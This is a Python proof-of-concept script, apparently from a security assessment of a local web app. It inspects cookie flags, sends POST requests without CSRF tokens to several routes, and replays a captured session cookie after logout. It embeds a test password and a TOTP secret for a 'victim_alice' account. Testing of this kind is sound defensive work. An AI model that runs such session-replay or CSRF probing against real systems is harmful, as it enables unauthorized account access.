"""
POC 5: Session Handling, Cookie Flags, Replay after Logout, and CSRF Protection
Target: http://127.0.0.1:5000

Checks:
1. Cookie Flags: HttpOnly, Secure, SameSite.
2. CSRF Enforcement on all state-altering POST routes.
3. Session Invalidation on Logout: Does a captured session cookie still work after /logout?
"""

import http.cookiejar
import re
import urllib.parse
import urllib.request
import pyotp

BASE_URL = "http://127.0.0.1:5000"

def run_poc():
    print("[*] Testing Session Security, Cookie Flags, CSRF & Replay...")

    # -------------------------------------------------------------------------
    # 1. Cookie Flags Inspection
    # -------------------------------------------------------------------------
    print("\n--- 1. Inspecting Session Cookie Flags ---")
    resp = urllib.request.urlopen(f"{BASE_URL}/login")
    cookie_hdr = resp.headers.get("Set-Cookie", "")
    print(f"    Raw Set-Cookie Header: {cookie_hdr}")
    has_http_only = "HttpOnly" in cookie_hdr
    has_same_site = "SameSite=" in cookie_hdr
    has_secure = "Secure" in cookie_hdr
    print(f"    -> HttpOnly Present: {has_http_only}")
    print(f"    -> SameSite Present: {has_same_site}")
    print(f"    -> Secure Flag Present: {has_secure}")
    if not has_secure:
        print("    [!] FLAW: 'Secure' flag is MISSING! Cookies can be transmitted over unencrypted HTTP.")

    # -------------------------------------------------------------------------
    # 2. CSRF Enforcement across all POST endpoints
    # -------------------------------------------------------------------------
    print("\n--- 2. Testing CSRF Rejection on POST Endpoints ---")
    post_routes = [
        ("/loginsubmit", {"username": "admin", "password": "Pass"}),
        ("/verify-otp", {"otp": "123456"}),
        ("/createuser", {"username": "user", "email": "a@b.com", "password": "pw", "confirm_password": "pw"}),
        ("/forgot-password", {"username": "admin", "new_password": "newpassword123"}),
        ("/forgot-username", {"email": "test@example.com"}),
    ]
    for route, dummy_data in post_routes:
        req = urllib.request.Request(
            f"{BASE_URL}{route}",
            data=urllib.parse.urlencode(dummy_data).encode("utf-8"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            method="POST",
        )
        try:
            r = urllib.request.urlopen(req)
            print(f"    [!] CSRF BYPASS on {route}! Status: {r.status}")
        except urllib.error.HTTPError as e:
            if e.code == 400:
                print(f"    [+] {route}: HTTP 400 (CSRF Blocked Properly)")
            elif e.code == 429:
                print(f"    [-] {route}: HTTP 429 (Rate Limited prior to CSRF)")
            else:
                print(f"    [?] {route}: HTTP {e.code}")

    # -------------------------------------------------------------------------
    # 3. Session Replay After Logout
    # -------------------------------------------------------------------------
    print("\n--- 3. Testing Session Invalidation on /logout ---")
    cj = http.cookiejar.CookieJar(policy=http.cookiejar.DefaultCookiePolicy(secure_protocols=("https", "http")))
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def http_error_302(self, req, fp, code, msg, headers):
            return fp

    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NoRedirect())
    
    # Login as victim_alice
    login_pg = opener.open(f"{BASE_URL}/login").read().decode("utf-8")
    csrf1 = re.search(r'name="csrf_token"\s+value="([^"]+)"', login_pg).group(1)
    opener.open(urllib.request.Request(
        f"{BASE_URL}/loginsubmit",
        data=urllib.parse.urlencode({"csrf_token": csrf1, "username": "victim_alice", "password": "PwnedPassword2026!"}).encode("utf-8"),
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    ))
    
    # 2FA with secret
    totp_secret = "EZ6NAKNUOHT2PXGHGCZJ77X6I5I5Z53N"
    current_otp = pyotp.TOTP(totp_secret).now()
    otp_pg = opener.open(f"{BASE_URL}/verify-otp").read().decode("utf-8")
    csrf_otp = re.search(r'name="csrf_token"\s+value="([^"]+)"', otp_pg).group(1)
    opener.open(urllib.request.Request(
        f"{BASE_URL}/verify-otp",
        data=urllib.parse.urlencode({"csrf_token": csrf_otp, "otp": current_otp}).encode("utf-8"),
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    ))

    # Capture authenticated session cookie
    auth_session_cookie = None
    for cookie in cj:
        if cookie.name == "session":
            auth_session_cookie = cookie.value
    print(f"    [+] Captured Authenticated Session Cookie: {auth_session_cookie[:30]}...")

    # Perform /logout
    logout_resp = opener.open(f"{BASE_URL}/logout")
    print(f"    [+] GET /logout called. Response Status: {logout_resp.status}, Redirect: {logout_resp.headers.get('Location')}")

    # Now replay the captured authenticated cookie to access /dashboard
    replay_req = urllib.request.Request(f"{BASE_URL}/dashboard", headers={"Cookie": f"session={auth_session_cookie}"})
    try:
        replay_resp = urllib.request.urlopen(replay_req)
        dash_body = replay_resp.read().decode("utf-8")
        if "Welcome, victim_alice" in dash_body:
            print("    [!] CRITICAL FLAW: Session cookie is STILL VALID after logout! Server lacks server-side session invalidation / revocation list!")
        else:
            print("    [+] Session rejected on /dashboard.")
    except urllib.error.HTTPError as e:
        print(f"    [+] Replay rejected with HTTP {e.code}")

if __name__ == "__main__":
    run_poc()
